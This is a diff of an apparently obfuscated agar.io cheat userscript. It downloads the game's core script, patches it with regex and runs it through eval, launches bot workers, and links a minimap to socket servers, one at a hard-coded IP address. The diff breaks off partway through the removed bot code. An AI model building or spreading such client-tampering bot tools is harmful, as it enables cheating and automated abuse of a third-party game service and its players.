@@ -1,471 +1,309 @@
-console.log = function() {}
-document.documentElement.innerHTML = null;
-            elementMock = {
-                getContext: function() {
-                    return {
-                        canvas: {
-                            width: 1,
-                            height: 1
-                        },
-                        clearRect: function() {},
-                        save: function() {},
-                        translate: function() {},
-                        scale: function() {},
-                        stroke: function() {},
-                        arc: function() {},
-                        fill: function() {},
-                        moveTo: function() {},
-                        lineTo: function() {},
-                        closePath: function() {},
-                        beginPath: function() {},
-                        restore: function() {},
-                        fillRect: function() {},
-                        measureText: function() {
-                            return {}
-                        },
-                        strokeText: function() {},
-                        fillText: function() {},
-                        drawImage: function() {}
-                    }
-                },
-                innerText: "",
-                div: {
-                    appendChild: function() {}
-                },
-                appendChild: function() {},
-                style: {}
-            },
-            document = {
-                getElementById: function() {
-                    return elementMock
-                },
-                createElement: function(a) {
-                    return elementMock
-                },
-                body: {
-                    firstChild: {},
-                    insertBefore: function() {}
-                }
-            },
-            Image = function() {};
-function escapeHtml(a) {
-    return String(a).replace(/[&<>"'\/]/g, function(a) {
-        return entityMap[a]
+function escapeHtml(_0xe846x2) {
+    return String(_0xe846x2).replace(/[&<>"'\/]/g, function(_0xe846x2) {
+        return entityMap[_0xe846x2]
     })
 }
 
-function updateBotCount(a, b) {
-    G047.localBotsAlive[a] = b;
-    for (var c = G047.serverBots, d = 2 + G047.serverBots, e = 0; e < 2; e++) G047.localBotsAlive[e] && c++;
-    0 == c ? $("#botCount").html('<font color="red">0 / ' + d + "</font>") : $("#botCount").html('<font color="#7FFF00">' + c + " / " + d + "</font>")
+function replaceRegexFile(_0xe846x2, b, _0xe846x5) {
+    var _0xe846x6 = new RegExp(b);
+    return _0xe846x6.test(_0xe846x2) ? _0xe846x2 = _0xe846x2.replace(b, _0xe846x5) : console.log("[Failed] to replace: " + b), _0xe846x2
 }
 
-function startLocalBots() {
-    for (var a = 0; a < 0; a++) G047.localBotsAlive[a] = !1, G047.localBots[a] = new Worker(URL.createObjectURL(new Blob(["(" + generateBotFunction() + ")()"], {
-        type: "text/javascript"
-    }))), G047.localBots[a].onmessage = function(a) {
-        var b = a.data;
-        switch (b.name) {
-            case "add":
-                updateBotCount(b.botID, !0), addBallToMinimap(!0, "bot" + b.botID, b.botName, b.x, b.y, "#FF00FF", !0);
-                break;
-            case "remove":
-                updateBotCount(b.botID, !1), removeBallFromMinimap("bot" + b.botID);
-                break;
-            case "position":
-                moveBallOnMinimap("bot" + b.botID, b.x, b.y);
-                break;
-            default:
-                console.log("Unknown command received from bot")
-        }
-    }, G047.localBots[a].postMessage({
-        name: "botID",
-        botID: a
-    });
+function replaceNormalFile(_0xe846x2, b, _0xe846x5) {
+    return _0xe846x2.indexOf(b) != -1 ? _0xe846x2 = _0xe846x2.replace(b, _0xe846x5) : console.log("[Failed] to replace: " + b), _0xe846x2
+}
+
+function isNumber(_0xe846x2) {
+    return !isNaN(parseFloat(_0xe846x2))
+}
+
+function MinimapBall(_0xe846x2, b, _0xe846x5, _0xe846x6, _0xe846xa, _0xe846xb) {
+    this.isDefault = _0xe846x2, this.name = b, this.x = _0xe846x5, this.y = _0xe846x6, this.lastX = _0xe846x5, this.lastY = _0xe846x6, this.color = _0xe846xa, this.visible = _0xe846xb
+}
+
+function Bot(_0xe846x2) {
+    this.id = _0xe846x2, this.worker = null, this.alive = !1, this.x = 0, this.y = 0, this.lastUpdate = Date.now()
+}
+
+function updateBotCount() {
+    for (var _0xe846x2 = G047.currentServerBots, b = 2 + G047.maxServerBots, _0xe846x5 = 0; _0xe846x5 < 2; _0xe846x5++) {
+        bots[_0xe846x5] && bots[_0xe846x5].alive && _0xe846x2++
+    };
+    0 === _0xe846x2 ? $("#botCount").html("<font color=\"red\">0 / " + b + "</font>") : $("#botCount").html("<font color=\"#7FFF00\">" + _0xe846x2 + " / " + b + "</font>")
+}
+
+function startBots() {
+    for (var _0xe846x2 = 0; _0xe846x2 < 2; _0xe846x2++) {
+        bots[_0xe846x2] = new Bot(_0xe846x2), bots[_0xe846x2].start()
+    };
     updateBotNames()
 }
 
-function startRemoteBots() {
-    for (var a = 0; a < 10; a++) G047.remoteBots[a] = new Worker(URL.createObjectURL(new Blob(["(" + generateBotFunction() + ")()"], {
-        type: "text/javascript"
-    })))
-}
-
-function sendLocalBotsMessage(a) {
-    for (i in G047.localBots) G047.localBots[i].postMessage(a)
-}
-
-function sendRemoteBotsMessage(a) {
-    for (i in G047.remoteBots) G047.remoteBots[i].postMessage(a)
-}
-
-function insertCore() {
-    var f = new XMLHttpRequest;
-    f.open("GET", "/agario.core.js", !0), f.onload = function() {
-        var script = f.responseText;
-        script = replaceNormalFile(script, "if(h.MC&&h.MC.onPlayerSpawn)", "G047.playerSpawned();if(h.MC&&h.MC.onPlayerSpawn)"), script = replaceNormalFile(script, "if(h.MC&&h.MC.onPlayerDeath)", "G047.playerDied();if(h.MC&&h.MC.onPlayerDeath)"), script = replaceNormalFile(script, "if(h.MC&&h.MC.onAgarioCoreLoaded)", "G047.onAgarioCoreLoaded();if(h.MC&&h.MC.onAgarioCoreLoaded)"), script = replaceNormalFile(script, "if(h.MC&&h.MC.onDisconnect)", "G047.playerDisconnected();if(h.MC&&h.MC.onDisconnect)"), script = replaceNormalFile(script, "connect:function(a){", "connect:function(a){G047.playerConnected(a);"), script = replaceNormalFile(script, "sendSpectate:function(){", "sendSpectate:function(){G047.playerSpectated();"), script = replaceNormalFile(script, "sendNick:function(a){", "sendNick:function(a){G047.updateNickname(a);"), script = replaceNormalFile(script, "setTarget:function(a,b){", "setTarget:function(a,b){if(G047.stopMovement){a = $('#canvas').width() / 2; b = $('#canvas').height() / 2;}"), script = replaceRegexFile(script, /(\w\[\w\+(\d+)>>3]=(\w);\w\[\w\+(\d+)>>3]=(\w);\w\[\w\+(\d+)>>3]=(\w);\w\[\w\+(\d+)>>3]=(\w);)/i, "$1 if(G047.setMapCoords){G047.setMapCoords($3,$5,$7,$9,$2,$8);}"), script = replaceRegexFile(script, /([\w$]+\(\d+,\w\[\w>>2\]\|0,(\+\w),(\+\w)\)\|0;[\w$]+\(\d+,\w\[\w>>2\]\|0,\+-(\+\w\[\w\+\d+>>3\]),\+-(\+\w\[\w\+\d+>>3\])\)\|0;)/i, "$1 G047.playerX=$4; G047.playerY=$5;"), script = replaceRegexFile(script, /if\((\+\w\[\w>>3\])<1\.0\){/i, "if($1 < G047.zoomResetValue){"), script = replaceRegexFile(script, /(if\(\w<=)(20\.0)(\){\w=\w;return})(if\(!\w\){if\(\(\w\[\d+\]\|0\)!=\(\w\[\d+\]\|0\)\){\w=\w;return}if\(\(\w\[\w\+\d+>>0\]\|0\)!=0\?\(\w\[\w>>0\]\|0\)==0:0\){\w=\w;return}})/i, "$140.0$3"), script = replaceRegexFile(script, /(\w)(=\+\w\[\w>>3\]\*\+\w\()(.\d)(,\+\w\);)/i, "$1$2 (G047.zoomSpeedValue||0.9) $4 G047.zoomValue=$1;"), script = replaceRegexFile(script, /(\w=\w\[\w>>2\]\|0;)((\w\[\w>>3\])=(\w);)(\w\[\w>>0\]=a\[\w>>0\];)/i, "$1 if(!G047.autoZoom){$3 = G047.zoomValue;}else{$2}$5"), script = replaceRegexFile(script, /((\w)=(\+\(\(\w\[\w\+\d+>>\d.*;)(\w)=(\+\(\(\w\[.*\/2\|\d\)\|0\)\/\w\+\s\+\w\[\w\+\d+>>3\];).*\4=\4<\w\?\w:\w;)/, "G047.mouseX = $3 G047.mouseY = $5 $1"), eval(script)
-    }, f.send()
-}
-
-function MinimapBall(a, b, c, d, e, f) {
-    this.isDefault = a, this.name = b, this.x = c, this.y = d, this.lastX = c, this.lastY = d, this.color = e, this.visible = f
-}
-
-function drawMinimap() {
-    if (null != miniMap ? minimapCtx.clearRect(0, 0, 200, 200) : (miniMap = document.getElementById("minimap"), minimapCtx = miniMap.getContext("2d"), miniMap.width = 400, miniMap.height = 400, miniMap.style.width = "200px", miniMap.style.height = "200px", minimapCtx.scale(2, 2)), G047.mapOffsetFixed && G047.drawMinimap) {
-        minimapCtx.globalAlpha = .4, minimapCtx.fillStyle = "#000000", minimapCtx.fillRect(0, 0, miniMap.width, miniMap.height);
-        var a = 200 / G047.mapSize,
-            b = 200 / G047.mapSize;
-        minimapCtx.globalAlpha = 1;
-        for (ball in minimapBalls) minimapBalls[ball].draw(minimapCtx, a, b)
+function sendBotsMessage(_0xe846x2, b) {
+    for (var _0xe846x5 in bots) {
+        _0xe846x2 ? bots[_0xe846x5].id < 2 && bots[_0xe846x5].worker.postMessage(b) : bots[_0xe846x5].id > 1 && bots[_0xe846x5].worker.postMessage(b)
     }
 }
 
+function checkBotsRestart() {
+    for (var _0xe846x2 in bots) {
+        Date.now() - bots[_0xe846x2].lastUpdate > 2e3 && (bots[_0xe846x2].worker.terminate(), bots[_0xe846x2].lastUpdate = Date.now(), bots[_0xe846x2].start(), bots[_0xe846x2].id < 2 ? bots[_0xe846x2].worker.postMessage({
+            name: "server",
+            server: G047.server
+        }) : bots[_0xe846x2].id > 1 && bots[_0xe846x2].worker.postMessage({
+            name: "server",
+            server: G047.remoteBotsServer
+        }), console.log("Restarted bot: " + _0xe846x2))
+    }
+}
+
+function updateRemoteBotCount(_0xe846x2) {
+    $("#newBotCount").val(_0xe846x2), $("#botSlider").val(_0xe846x2)
+}
+
+function insertCore() {
+    var _0xe846xb = new XMLHttpRequest;
+    _0xe846xb.open("GET", "/agario.core.js", !0), _0xe846xb.onload = function() {
+        var _0xe846x13 = _0xe846xb.responseText;
+        _0xe846x13 = replaceNormalFile(_0xe846x13, "if(h.MC&&h.MC.onPlayerSpawn)", "G047.playerSpawned();if(h.MC&&h.MC.onPlayerSpawn)"), _0xe846x13 = replaceNormalFile(_0xe846x13, "if(h.MC&&h.MC.onPlayerDeath)", "G047.playerDied();if(h.MC&&h.MC.onPlayerDeath)"), _0xe846x13 = replaceNormalFile(_0xe846x13, "if(h.MC&&h.MC.onAgarioCoreLoaded)", "G047.onAgarioCoreLoaded();if(h.MC&&h.MC.onAgarioCoreLoaded)"), _0xe846x13 = replaceNormalFile(_0xe846x13, "if(h.MC&&h.MC.onDisconnect)", "G047.playerDisconnected();if(h.MC&&h.MC.onDisconnect)"), _0xe846x13 = replaceNormalFile(_0xe846x13, "connect:function(a){", "connect:function(a){G047.playerConnected(a);"), _0xe846x13 = replaceNormalFile(_0xe846x13, "sendSpectate:function(){", "sendSpectate:function(){G047.playerSpectated();"), _0xe846x13 = replaceNormalFile(_0xe846x13, "sendNick:function(a){", "sendNick:function(a){G047.updateNickname(a);"), _0xe846x13 = replaceNormalFile(_0xe846x13, "setTarget:function(a,b){", "setTarget:function(a,b){if(G047.stopMovement){a = $('#canvas').width() / 2; b = $('#canvas').height() / 2;}"), _0xe846x13 = replaceRegexFile(_0xe846x13, /(\w\[\w\+(\d+)>>3]=(\w);\w\[\w\+(\d+)>>3]=(\w);\w\[\w\+(\d+)>>3]=(\w);\w\[\w\+(\d+)>>3]=(\w);)/i, "$1 if(G047.setMapCoords){G047.setMapCoords($3,$5,$7,$9,$2,$8);}"), _0xe846x13 = replaceRegexFile(_0xe846x13, /([\w$]+\(\d+,\w\[\w>>2\]\|0,(\+\w),(\+\w)\)\|0;[\w$]+\(\d+,\w\[\w>>2\]\|0,\+-(\+\w\[\w\+\d+>>3\]),\+-(\+\w\[\w\+\d+>>3\])\)\|0;)/i, "$1 G047.playerX=$4; G047.playerY=$5;"), _0xe846x13 = replaceRegexFile(_0xe846x13, /if\((\+\w\[\w>>3\])<1\.0\){/i, "if($1 < G047.zoomResetValue){"), _0xe846x13 = replaceRegexFile(_0xe846x13, /(if\(\w<=)(20\.0)(\){\w=\w;return})(if\(!\w\){if\(\(\w\[\d+\]\|0\)!=\(\w\[\d+\]\|0\)\){\w=\w;return}if\(\(\w\[\w\+\d+>>0\]\|0\)!=0\?\(\w\[\w>>0\]\|0\)==0:0\){\w=\w;return}})/i, "$140.0$3"), _0xe846x13 = replaceRegexFile(_0xe846x13, /(\w)(=\+\w\[\w>>3\]\*\+\w\()(.\d)(,\+\w\);)/i, "$1$2 (G047.zoomSpeedValue||0.9) $4 G047.zoomValue=$1;"), _0xe846x13 = replaceRegexFile(_0xe846x13, /(\w=\w\[\w>>2\]\|0;)((\w\[\w>>3\])=(\w);)(\w\[\w>>0\]=a\[\w>>0\];)/i, "$1 if(!G047.autoZoom){$3 = G047.zoomValue;}else{$2}$5"), _0xe846x13 = replaceRegexFile(_0xe846x13, /((\w)=(\+\(\(\w\[\w\+\d+>>\d.*;)(\w)=(\+\(\(\w\[.*\/2\|\d\)\|0\)\/\w\+\s\+\w\[\w\+\d+>>3\];).*\4=\4<\w\?\w:\w;)/, "G047.mouseX = $3 G047.mouseY = $5 $1"), eval(_0xe846x13)
+    }, _0xe846xb.send()
+}
+
+function drawMinimap() {
+    var _0xe846x2 = 200,
+        b = 30;
+    if (null !== minimap ? minimapCtx.clearRect(0, 0, _0xe846x2 + b, _0xe846x2 + b) : (minimap = document.getElementById("minimap"), minimapCtx = minimap.getContext("2d"), minimap.width = _0xe846x2 + b, minimap.height = _0xe846x2 + b), minimapCtx.save(), minimapCtx.globalAlpha = 0.4, minimapCtx.fillRect(0, 0, _0xe846x2 + b, _0xe846x2 + b), minimapCtx.translate(b / 2, b / 2), minimapCtx.strokeStyle = "#EEEEEE", minimapCtx.beginPath(), minimapCtx.moveTo(-1, 0), minimapCtx.lineTo(_0xe846x2 + 1, 0), minimapCtx.moveTo(0, 1), minimapCtx.lineTo(0, _0xe846x2 + 1), minimapCtx.moveTo(1, _0xe846x2), minimapCtx.lineTo(_0xe846x2 + 1, _0xe846x2), minimapCtx.moveTo(_0xe846x2, 1), minimapCtx.lineTo(_0xe846x2, _0xe846x2 - 1), minimapCtx.stroke(), minimapCtx.globalAlpha = 1, G047.mapOffsetFixed) {
+        for (var _0xe846x5 in minimapBalls) {
+            var _0xe846x6 = _0xe846x2 / G047.mapSize;
+            minimapBalls[_0xe846x5].draw(minimapCtx, _0xe846x6)
+        }
+    };
+    minimapCtx.restore()
+}
+
 function resetMinimap() {
-    for (ball in minimapBalls) minimapBalls[ball].isDefault || delete minimapBalls[ball]
+    for (var _0xe846x2 in minimapBalls) {
+        minimapBalls[_0xe846x2].isDefault || delete minimapBalls[_0xe846x2]
+    }
 }
 
-function addBallToMinimap(a, b, c, d, e, f, g) {
-    minimapBalls[b] = new MinimapBall(a, c, d, e, f, g)
+function addBallToMinimap(_0xe846x2, b, _0xe846x5, _0xe846x6, _0xe846xa, _0xe846xb, _0xe846x17) {
+    minimapBalls[b] = new MinimapBall(_0xe846x2, _0xe846x5, _0xe846x6, _0xe846xa, _0xe846xb, _0xe846x17)
 }
 
-function removeBallFromMinimap(a) {
-    minimapBalls[a] && delete minimapBalls[a]
+function removeBallFromMinimap(_0xe846x2) {
+    minimapBalls[_0xe846x2] && delete minimapBalls[_0xe846x2]
 }
 
-function moveBallOnMinimap(a, b, c) {
-    minimapBalls[a] && (minimapBalls[a].x = b, minimapBalls[a].y = c)
+function moveBallOnMinimap(_0xe846x2, b, _0xe846x5) {
+    minimapBalls[_0xe846x2] && (minimapBalls[_0xe846x2].x = b, minimapBalls[_0xe846x2].y = _0xe846x5)
 }
 
-function setBallVisible(a, b) {
-    minimapBalls[a] && (minimapBalls[a].visible = b)
+function setBallVisible(_0xe846x2, b) {
+    minimapBalls[_0xe846x2] && (minimapBalls[_0xe846x2].visible = b)
 }
 
-function changeNicknameOnBall(a, b) {
-    minimapBalls[a] && (minimapBalls[a].name = b)
+function changeNicknameOnBall(_0xe846x2, b) {
+    minimapBalls[_0xe846x2] && (minimapBalls[_0xe846x2].name = b)
 }
 
-function replaceRegexFile(a, b, c) {
-    var d = new RegExp(b);
-    return d.test(a) ? a = a.replace(b, c) : console.log("[Failed] to replace: " + b), a
+function sendMinimapServerCommand(_0xe846x2) {
+    null !== minimapSocket && minimapSocket.connected && minimapSocket.emit("command", _0xe846x2)
 }
 
-function replaceNormalFile(a, b, c) {
-    return a.indexOf(b) != -1 ? a = a.replace(b, c) : console.log("[Failed] to replace: " + b), a
+function sendBotServerCommand(_0xe846x2) {
+    null !== botSocket && botSocket.connected && botSocket.emit("command", _0xe846x2)
 }
 
-function sendCommand(a) {
-    null != socket && socket.connected && socket.emit("command", a)
-}
-
-function connectToG047Server() {
-    socket = io.connect("ws://localhost:8003", {
-        reconnection: true,
-        query: "key=" + client_uuid
-    }), socket.on("command", function(a) {
-        if (void 0 === a.name) return void console.log("Recieved a command with no name.");
-        switch (a.name) {
-            case "force-update":
-                resetMinimap(), transmit_current_server(!0), G047.isAlive && sendCommand({
-                    name: "alive",
-                    playerName: G047.playerName
-                });
-                break;
-            case "add":
-                addBallToMinimap(!1, a.socketID, a.playerName, a.x, a.y, "#FFFFFF", !0);
-                break;
-            case "remove":
-                removeBallFromMinimap(a.socketID);
-                break;
-            case "position":
-                moveBallOnMinimap(a.socketID, a.x, a.y);
-                break;
+function connectToBotServer() {
+    botSocket = io.connect("ws://localhost:8003", {
+        reconnection: !0,
+        query: "version=" + botVersion + "&key=" + client_uuid
+    }), botSocket.on("command", function(_0xe846x2) {
+        if (void(0) === _0xe846x2.name) {
+            return void(console).log("Recieved a command with no name.")
+        };
+        switch (_0xe846x2.name) {
             case "count":
-                G047.serverBots = a.count;
+                G047.currentServerBots = _0xe846x2.currentServerBots, G047.maxServerBots != _0xe846x2.maxServerBots && (G047.maxServerBots = _0xe846x2.maxServerBots, $("#botSlider").prop("max", G047.maxServerBots), updateRemoteBotCount(G047.maxServerBots)), updateBotCount();
                 break;
             case "auth":
-                G047.isAuthorized = a.auth, console.log("Your client is authorized for use of more bots.");
+                G047.isAuthorized = _0xe846x2.auth, _0xe846x2.auth ? ($("#uuiddiv").hide(), $("#sliderDiv").show(), console.log("Your client is authorized for use of more bots.")) : ($("#uuiddiv").show(), G047.currentServerBots = 0, G047.maxServerBots = 0, updateRemoteBotCount(0), $("#sliderDiv").hide(), console.log("Your client is not authorized for use of more bots."));
                 break;
             default:
-                return void console.log("Received a command with an unknown name: " + a.name)
+                return void(console).log("Received a command with an unknown name: " + _0xe846x2.name)
         }
-    }), socket.on("bots", function(a) {
-        "server" == a.name && (G047.remoteBotsServer = a.server), sendRemoteBotsMessage(a)
-    }), socket.on("disconnect", function() {
-        resetMinimap(), sendRemoteBotsMessage({
+    }), botSocket.on("connect", function() {
+        null !== G047.server && sendBotServerCommand({
+            name: "server",
+            server: G047.server
+        })
+    }), botSocket.on("bots", function(_0xe846x2) {
+        "server" == _0xe846x2.name && (G047.remoteBotsServer = _0xe846x2.server), sendBotsMessage(!1, _0xe846x2)
+    }), botSocket.on("disconnect", function() {
+        sendBotsMessage(!1, {
             name: "disconnect"
         })
     })
 }
 
+function connectToMinimapServer(_0xe846x2) {
+    resetMinimap(), null !== grabServerSocket && (grabServerSocket.disconnect(), grabServerSocket = null), grabServerSocket = io.connect("ws://96.31.85.154:8000", {
+        query: "version=" + minimapVersion + "&server=" + _0xe846x2
+    }), grabServerSocket.on("server", function(b) {
+        null !== minimapSocket && (minimapSocket.customDisconnect = !0, minimapSocket.disconnect(), minimapSocket = null), minimapSocket = io.connect(b, {
+            reconnection: !1,
+            query: "server=" + _0xe846x2
+        }), minimapSocket.on("command", function(_0xe846x2) {
+            if (void(0) === _0xe846x2.name) {
+                return void(console).log("Recieved a command with no name.")
+            };
+            switch (_0xe846x2.name) {
+                case "add":
+                    addBallToMinimap(!1, _0xe846x2.socketID, _0xe846x2.playerName, _0xe846x2.x, _0xe846x2.y, "#FFFFFF", !0);
+                    break;
+                case "remove":
+                    removeBallFromMinimap(_0xe846x2.socketID);
+                    break;
+                case "position":
+                    moveBallOnMinimap(_0xe846x2.socketID, _0xe846x2.x, _0xe846x2.y);
+                    break;
+                default:
+                    return void(console).log("Received a command with an unknown name: " + _0xe846x2.name)
+            }
+        }), minimapSocket.on("connect", function() {
+            G047.isAlive && sendMinimapServerCommand({
+                name: "alive",
+                playerName: G047.playerName
+            })
+        }), minimapSocket.on("disconnect", function() {
+            minimapSocket.customDisconnect ? minimapSocket = null : (minimapSocket = null, connectToMinimapServer(_0xe846x2))
+        }), null !== grabServerSocket && (grabServerSocket.disconnect(), grabServerSocket = null)
+    })
+}
+
 function updateBotNames() {
-    sendLocalBotsMessage({
+    sendBotsMessage(!0, {
         name: "names",
         botNames: G047.botNames
-    }), G047.isAuthorized && sendCommand({
+    }), G047.isAuthorized && sendBotServerCommand({
         name: "names",
         botNames: G047.botNames
     })
 }
 
-function validateNames(a) {
-    if (void 0 === a) return null;
-    if (a.indexOf(",") > -1) {
-        var b = a.split(",");
-        for (name in b)
-            if (b[name].length <= 0 || b[name].length > 15) return null;
+function validateNames(_0xe846x2) {
+    if (void(0) === _0xe846x2) {
+        return null
+    };
+    if (_0xe846x2.indexOf(",") > -1) {
+        var b = _0xe846x2.split(",");
+        for (var _0xe846x5 in b) {
+            if (b[_0xe846x5].length <= 0 || b[_0xe846x5].length > 15) {
+                return null
+            }
+        };
         return b
-    }
-    return a.length > 0 && a.length <= 15 ? [a] : null
+    };
+    return _0xe846x2.length > 0 && _0xe846x2.length <= 15 ? [_0xe846x2] : null
 }
 
 function emitSplit() {
-    G047.isAuthorized && sendCommand({
+    G047.isAuthorized && sendBotServerCommand({
         name: "split"
-    }), sendLocalBotsMessage({
+    }), sendBotsMessage(!0, {
         name: "split"
     })
 }
 
 function emitMassEject() {
-    G047.isAuthorized && sendCommand({
+    G047.isAuthorized && sendBotServerCommand({
         name: "eject"
-    }), sendLocalBotsMessage({
+    }), sendBotsMessage(!0, {
         name: "eject"
     })
 }
 
 function emitLocalPosition() {
-    var a = G047.mouseX,
+    var _0xe846x2 = G047.mouseX,
         b = G047.mouseY;
-    G047.moveToMouse || (a = G047.playerX, b = G047.playerY), sendLocalBotsMessage({
+    G047.moveToMouse || (_0xe846x2 = G047.playerX, b = G047.playerY), sendBotsMessage(!0, {
         name: "position",
-        x: a + G047.mapOffsetX,
+        x: _0xe846x2 + G047.mapOffsetX,
         y: b + G047.mapOffsetY
     })
 }
 
-function emitPosition() {
-    var a = G047.mouseX,
-        b = G047.mouseY;
-    G047.moveToMouse || (a = G047.playerX, b = G047.playerY), sendCommand({
+function emitMinimapPosition() {
+    sendMinimapServerCommand({
         name: "position",
         x: G047.realPlayerX,
-        y: G047.realPlayerY,
-        botX: a + G047.mapOffsetX,
-        botY: b + G047.mapOffsetY
+        y: G047.realPlayerY
     })
 }
 
-function transmit_current_server(a) {
-    (a || last_transmited_game_server != G047.server) && (last_transmited_game_server = G047.server, sendCommand({
-        name: "server",
-        server: last_transmited_game_server
-    }))
+function emitBotPosition() {
+    var _0xe846x2 = G047.mouseX,
+        b = G047.mouseY;
+    G047.moveToMouse || (_0xe846x2 = G047.playerX, b = G047.playerY), sendBotServerCommand({
+        name: "position",
+        x: _0xe846x2 + G047.mapOffsetX,
+        y: b + G047.mapOffsetY
+    })
 }
-
-function generateBotFunction() {
-    return function() {
-        function replaceRegexFile(a, b, c) {
-            var d = new RegExp(b);
-            return d.test(a) ? a = a.replace(b, c) : console.log("[Failed] to replace: " + b), a
+var botVersion = 1,
+    minimapVersion = 2;
+window.history.replaceState("", "", "/" + location.hash);
+var entityMap = {
+    "&": "&amp;",
+    "<": "&lt;",
+    ">": "&gt;",
+    "\"": "&quot;",
+    "\'": "&#39;",
+    "/": "&#x2F;"
+};
+MinimapBall.prototype = {
+    draw: function(_0xe846x2, b) {
+        if (this.visible) {
+            this.lastX = (29 * this.lastX + this.x) / 30, this.lastY = (29 * this.lastY + this.y) / 30;
+            var _0xe846x5 = ((this.isDefault ? this.x : this.lastX) + G047.mapOffset) * b,
+                _0xe846x6 = ((this.isDefault ? this.y : this.lastY) + G047.mapOffset) * b;
+            _0xe846x2.fillStyle = this.color, _0xe846x2.font = "10px Ubuntu", _0xe846x2.textAlign = "center", _0xe846x2.fillText("" === this.name ? "An unnamed cell" : this.name, _0xe846x5, _0xe846x6 - 10), _0xe846x2.beginPath(), _0xe846x2.arc(_0xe846x5, _0xe846x6, 4.5, 0, 2 * Math.PI, !1), _0xe846x2.closePath(), _0xe846x2.fillStyle = this.color, _0xe846x2.fill()
         }
-
-        function replaceNormalFile(a, b, c) {
-            return a.indexOf(b) != -1 ? a = a.replace(b, c) : console.log("[Failed] to replace: " + b), a
-        }
-
-        function getRandomInt(a, b) {
-            return Math.floor(Math.random() * (b - a + 1)) + a
-        }
-
-        function getBotCore() {
-            var e = new XMLHttpRequest;
-            e.open("GET", "http://agar.io/agario.core.js", !0), e.onload = function() {
-                var script = e.responseText;
-                script = replaceRegexFile(script, /\w+\.location\.hostname/g, '"agar.io"'), script = replaceNormalFile(script, "window", "self"), script = replaceNormalFile(script, "c.setStatus=function(a){console.log(a)};", "c.setStatus=function(a){};"), script = replaceNormalFile(script, 'console.log("postRun");', ""), script = replaceRegexFile(script, /(\w)=\+\(\(\w\[\w\+\d+>>\d.*;(\w)=\+\(\(\w\[.*\/2\|\d\)\|0\)\/\w\+\s\+\w\[\w\+\d+>>3\];/, "$1 = G047.newX; $2 = G047.newY;"), script = replaceNormalFile(script, "if(h.MC&&h.MC.onPlayerSpawn)", "G047.playerSpawned();if(h.MC&&h.MC.onPlayerSpawn)"), script = replaceNormalFile(script, "if(h.MC&&h.MC.onPlayerDeath)", "G047.playerDied();if(h.MC&&h.MC.onPlayerDeath)"), script = replaceNormalFile(script, "if(h.MC&&h.MC.onAgarioCoreLoaded)", "G047.onAgarioCoreLoaded();if(h.MC&&h.MC.onAgarioCoreLoaded)"), script = replaceNormalFile(script, "if(h.MC&&h.MC.onDisconnect)", "G047.playerDisconnected();if(h.MC&&h.MC.onDisconnect)"), script = replaceNormalFile(script, "h.MC&&h.MC.corePendingReload", "G047.reloadCore();h.MC&&h.MC.corePendingReload"), script = replaceRegexFile(script, /(\w\[\w\+(\d+)>>3]=(\w);\w\[\w\+(\d+)>>3]=(\w);\w\[\w\+(\d+)>>3]=(\w);\w\[\w\+(\d+)>>3]=(\w);)/i, "$1 if(G047.setMapCoords){G047.setMapCoords($3,$5,$7,$9,$2,$8);}"), script = replaceRegexFile(script, /([\w$]+\(\d+,\w\[\w>>2\]\|0,(\+\w),(\+\w)\)\|0;[\w$]+\(\d+,\w\[\w>>2\]\|0,\+-(\+\w\[\w\+\d+>>3\]),\+-(\+\w\[\w\+\d+>>3\])\)\|0;)/i, "$1 G047.playerX=$4; G047.playerY=$5; G047.setPath();"), script = replaceRegexFile(script, /(do\sif\(\w\){)((\w)=!\(\+\w\[\w>>2]<=20.0\);)(.+,\w\[\w>>2\]\|0,(\+\(\+\w\[\w>>2\]\)),(\+\(\+\w\[\w>>2\]\)),\+\((\+\w\[\w>>2\]))/, "$1var cellSize=$7;$2if(!$3){G047.recordPellet($5,$6,cellSize);}$4"), eval(script)
-            }, e.send(null)
-        }
-        self.innerWidth = 1, self.innerHeight = 1;
-        const window = {},
-            elementMock = {
-                getContext: function() {
-                    return {
-                        canvas: {
-                            width: 1,
-                            height: 1
-                        },
-                        clearRect: function() {},
-                        save: function() {},
-                        translate: function() {},
-                        scale: function() {},
-                        stroke: function() {},
-                        arc: function() {},
-                        fill: function() {},
-                        moveTo: function() {},
-                        lineTo: function() {},
-                        closePath: function() {},
-                        beginPath: function() {},
-                        restore: function() {},
-                        fillRect: function() {},
-                        measureText: function() {
-                            return {}
-                        },
-                        strokeText: function() {},
-                        fillText: function() {},
-                        drawImage: function() {}
-                    }
-                },
-                innerText: "",
-                div: {
-                    appendChild: function() {}
-                },
-                appendChild: function() {},
-                style: {}
-            },
-            document = {
-                getElementById: function() {
-                    return elementMock
-                },
-                createElement: function(a) {
-                    return elementMock
-                },
-                body: {
-                    firstChild: {},
-                    insertBefore: function() {}
-                }
-            },
-            Image = function() {};
-        self.G047 = {
-            server: null,
-            botID: 0,
-            botName: "trump",
-            playerX: 0,
-            playerY: 0,
-            newX: 0,
-            newY: 0,
-            realPlayerX: null,
-            realPlayerY: null,
-            mapOffset: 7071,
-            mapOffsetX: 0,
-            mapOffsetY: 0,
-            mapOffsetFixed: !1,
-            collectPellets: !1,
-            pelletTargetX: 99999,
-            pelletTargetY: 99999,
-            pellets: [],
-            recordPellet: function(a, b, c) {
-                this.pellets.push({
-                    x: a,
-                    y: b,
-                    size: c
-                })
-            },
-            setMapCoords: function(a, b, c, d, e, f) {
-                f - e == 24 && c - a > 14e3 && d - b > 14e3 && (this.mapOffsetX = this.mapOffset - c, this.mapOffsetY = this.mapOffset - d, this.mapOffsetFixed = !0)
-            },
-            playerDied: function() {
-                postMessage({
-                    name: "remove",
-                    botID: G047.botID
-                })
-            },
-            playerSpawned: function() {
-                postMessage({
-                    name: "add",
-                    botID: G047.botID,
-                    botName: G047.botName,
-                    x: G047.realPlayerX,
-                    y: G047.realPlayerY
-                })
-            },
-            playerDisconnected: function() {
-                postMessage({
-                    name: "remove",
-                    botID: G047.botID
-                }), self.core && core.connect(G047.server)
-            },
-            reloadCore: function() {
-                self.core && self.core.destroy(), getBotCore()
-            },
-            onAgarioCoreLoaded: function() {
-                null != G047.server && self.core && core.connect(G047.server)
-            },
-            setPath: function() {
-                for (var a = -1, b = 0, c = 0; c < this.pellets.length; c++) {
-                    var d = this.getDistanceBetweenPositions(this.pellets[c].x, this.pellets[c].y, this.playerX, this.playerY);
-                    a != -1 && d > b || (a = c, b = d)
-                }
-                a == -1 ? (this.pelletTargetX = 99999, this.pelletTargetY = 99999) : (this.pelletTargetX = this.pellets[a].x, this.pelletTargetY = this.pellets[a].y), this.pellets = []
-            },
-            getDistanceBetweenPositions: function(a, b, c, d) {
